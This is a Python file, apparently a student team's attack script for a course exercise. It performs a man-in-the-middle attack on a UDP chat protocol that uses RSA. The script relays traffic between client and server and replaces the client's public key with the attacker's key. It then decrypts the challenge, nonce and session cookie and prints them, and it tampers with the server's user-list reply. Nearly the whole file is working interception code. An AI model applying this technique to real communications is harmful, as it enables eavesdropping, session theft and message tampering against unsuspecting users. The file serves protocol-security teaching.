import pickle
import socket
from util import RSAencryption, readRSApublicKey, keyEncryption, RSAdecryption, readRSAprivateKey
RECV_BUFFER_SIZE = 65535
import sys
"""
Team venkatesan-saisujitha attack
"""
sai_flag = 0
sai_client_address = None
# attack 1
# python ChatClient.py -cpub c1public.der -cpri c1private.der -spub spublic.der -sip 127.0.0.1 -sp 8084
# python ChatServer.py spublic.der sprivate.der 127.0.0.1 8080
def mitm_saisujitha():
    global sai_client_address
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    server_address = (sys.argv[1], int(sys.argv[2]))  # the address the real server listening to
    fake_server_address = ('127.0.0.1', 8084)  # the address attacker listening to
    s.bind(fake_server_address)
    flag = 0
    while flag == 0:
        serialized_message, address = s.recvfrom(RECV_BUFFER_SIZE)
        if len(serialized_message) > 0:
            message = pickle.loads(serialized_message)
            ip, port = address
            if port == 8080:
                receive_message_from_server_then_relay(s, message, sai_client_address)
            else:
                sai_client_address = address
                receive_message_from_client_then_relay(s, message, server_address)


def receive_message_from_client_then_relay(s, message, server_address):
    global sai_flag
    if sai_flag == 0:
        # get server's public key
        spub_path = './sai_keys/spublic.der'
        # get attacker's public encrypted with server's public key: {atkKey}_server
        attacker_public_key_path = './attacker_keys/t_public_key.der'
        attacker_key = open(attacker_public_key_path, 'rb').read()
        attacker_key_encrypt = keyEncryption(readRSApublicKey(spub_path), attacker_key)

        # replace client public key to attacker's public key, because they don't have authentication signature
        # s.sendto(pickle.dumps(message), server_address)
        message[1] = attacker_key_encrypt
        # print message[1]

        serialized_modified_message = pickle.dumps(message)
        s.sendto(serialized_modified_message, server_address)
        sai_flag = 1
    else:
        serialized_modified_message = pickle.dumps(message)
        s.sendto(serialized_modified_message, server_address)


def receive_message_from_server_then_relay(s, message, client_address):
    attacker_private_key_path = './attacker_keys/t_private_key.der'
    client_public_key_path = './sai_keys/c1public.der'
    header = RSAdecryption(readRSAprivateKey(attacker_private_key_path), message[0])
    if header == 'Hello':
        challenge = RSAdecryption(readRSAprivateKey(attacker_private_key_path), message[1])
        rand = int(RSAdecryption(readRSAprivateKey(attacker_private_key_path), message[2]))
        print 'challenge: {0}\nrandom: {0}'.format(challenge, rand)
        # encrypt messages using client's public key and send back to client
        message_to_client = RSAencryption(readRSApublicKey(client_public_key_path), header)
        challenge_to_client = RSAencryption(readRSApublicKey(client_public_key_path), challenge)
        random_to_client = RSAencryption(readRSApublicKey(client_public_key_path), str(rand))

        data = [message_to_client, challenge_to_client, random_to_client]
        serialized_message = pickle.dumps(data)
        s.sendto(serialized_message, client_address)
    if header == 'Cookie':
        dat = RSAdecryption(readRSAprivateKey(attacker_private_key_path), message[1])
        rand = RSAdecryption(readRSAprivateKey(attacker_private_key_path), message[2])
        print 'challenge: {0}\nrandom: {0}'.format(dat, rand)
        # encrypt messages using client's public key and send back to client
        cookie_to_client = RSAencryption(readRSApublicKey(client_public_key_path), header)
        dat_to_client = RSAencryption(readRSApublicKey(client_public_key_path), dat) # cookie
        random_to_client = RSAencryption(readRSApublicKey(client_public_key_path), rand)

        data = [cookie_to_client, dat_to_client, random_to_client]
        serialized_message = pickle.dumps(data)
        s.sendto(serialized_message, client_address)
    if header == 'list':
        modified_header = RSAencryption(readRSApublicKey(client_public_key_path), 'list')
        modified_list = RSAencryption(readRSApublicKey(client_public_key_path), 'H4k0r')
        original_cookie = str(RSAdecryption(readRSAprivateKey(attacker_private_key_path), message[2]))
        cookie_to_client = RSAencryption(readRSApublicKey(client_public_key_path), original_cookie)
        new_message = [modified_header, modified_list, cookie_to_client]
        serialized_message = pickle.dumps(new_message)
        s.sendto(serialized_message, client_address)


if __name__ == '__main__':
    mitm_saisujitha()

